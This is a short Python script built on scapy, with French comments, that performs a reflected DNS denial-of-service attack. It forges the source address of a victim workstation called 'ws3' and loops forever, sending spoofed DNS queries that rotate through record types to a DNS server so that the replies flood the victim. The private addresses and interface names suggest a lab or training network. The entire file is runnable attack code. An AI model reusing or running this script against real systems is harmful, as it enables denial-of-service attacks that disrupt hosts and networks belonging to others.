from scapy.all import IP, UDP, DNS, DNSQR, send
import random
import time

# Ce script est fait pour attaquer ws3. C'est la workstation qu'on veut inonder
# L'attaque est run depuis internet et utilise le server dns pour rediriger les paquets.

victim_ip = "10.1.0.3"          
dns_server_ip = "10.12.0.20"    
dns_server_port = 5353          

# on envoie les dns records différents à chaque fois
dns_record_types = ["A", "AAAA", "MX", "TXT", "CNAME", "NS", "SOA", "PTR"]

def get_next_dns_query_type():
    while True:
        for qtype in dns_record_types:
            yield qtype

def send_spoofed_dns_requests():
    print("Launching reflected DNS DoS attack targeting ws3 via DNS server...")
    query_type_gen = get_next_dns_query_type()
    while True:
        qtype = next(query_type_gen)
        dns_query = IP(src=victim_ip, dst=dns_server_ip) / \
                    UDP(sport=random.randint(1024, 65535), dport=dns_server_port) / \
                    DNS(rd=1, qd=DNSQR(qname="example.com", qtype=qtype))
        # envoyé depuis internet
        send(dns_query, verbose=False, iface="internet-eth0")
        print(f"This is the spoofed DNS query for: example.com ({qtype})")
        time.sleep(0.1)  

if __name__ == "__main__":
    try:
        send_spoofed_dns_requests()
    except KeyboardInterrupt:
        print("Attack interrupted by user")
